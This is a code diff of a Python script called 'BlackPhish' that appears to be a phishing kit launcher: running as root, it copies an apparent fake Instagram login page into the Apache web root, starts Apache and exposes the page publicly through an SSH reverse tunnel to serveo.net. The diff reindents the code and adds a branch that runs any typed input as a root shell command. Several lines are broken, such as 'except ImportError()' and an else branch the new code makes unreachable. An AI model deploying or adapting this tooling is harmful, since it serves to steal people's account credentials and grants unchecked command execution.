@@ -5,11 +5,11 @@
 # Please update version number each time we update
 
 try:
-	import os
+    import os
 
 except ImportError():
-	print("\033[31;1m" + "[!] Error importing")
-	exit(1)
+    print("\033[31;1m" + "[!] Error importing")
+    exit(1)
 
  # Variables #
 
@@ -36,46 +36,51 @@ white = "\033[37;1m"
 
 
 if os.geteuid() != 0:
-	exit(red + "[!] Please run as root" + reset)
+    exit(red + "[!] Please run as root" + reset)
 
 def serveo_forward(): # Port forward to serveo#
-	os.system('nohup ssh -R inc0gnit0:80:localhost:80 serveo.net')
-	#subprocess.Popen(["rm","-r","some.file"])
+    os.system('nohup ssh -R inc0gnit0:80:localhost:80 serveo.net &')
+    #subprocess.Popen(["rm","-r","some.file"])
+    
 
 def main():  # Main script #
 
-	choice = input("[BlackPhish] -> ") # Get user input #
- 
-	if choice == "1":
-		print(green + '[+] Copying Files')
-		os.system('cp ' + cwd + '/' + ' insta' '/var/www/html/')
-		print(green + '[+] Starting Apache2 Service')
-		os.system('service apache2 start')
-		serveo_forward()
-		print(green + '[+] Forwarding Traffic to \"https://inc0gnit0.serveo.net/\"')
-		print(green + '[+] Done')
-		main()
+    choice = input(cyan+"[BlackPhish] -> ") # Get user input #
 
-	elif choice == "clean":
-		os.system('service apache2 stop')
+    if choice == "1":
+        print(green + '[+] Copying Files')
+        os.system('cp ' + cwd  + '/insta' " /var/www/html/")
+        print(green + '[+] Starting Apache2 Service')
+        os.system('service apache2 start')
+        serveo_forward()
+        print(green + '[+] Forwarding Traffic to \"https://inc0gnit0.serveo.net/\"')
+        print(green + '[+] Done')
+        main()
 
-	elif choice == "clear":
-		os.system('clear')
-		main()
+    elif choice == "clean":
+        os.system('service apache2 stop')
 
-	#elif choice == "help":
-		#print('')
+    elif choice == "clear":
+        os.system('clear')
+        main()
+    elif choice != "":
+        os.system(""+choice)
+        main()
+    
 
-	else:
-		print(red + "[!] Invalid option" + reset)
-		main()
+    #elif choice == "help":
+        #print('')
+
+    else:
+        print(red + "[!] Invalid option" + reset)
+        main()
 
 
 try: # This will start the script
-	if __name__ == '__main__':
-		main()
+    if __name__ == '__main__':
+        main()
 
 except KeyboardInterrupt: # Will detect if they exit #
-	print("\n")
-	print(red + "[!] Exiting" + reset)
-	exit(0)
+    print("\n")
+    print(red + "[!] Exiting" + reset)
+    exit(0)
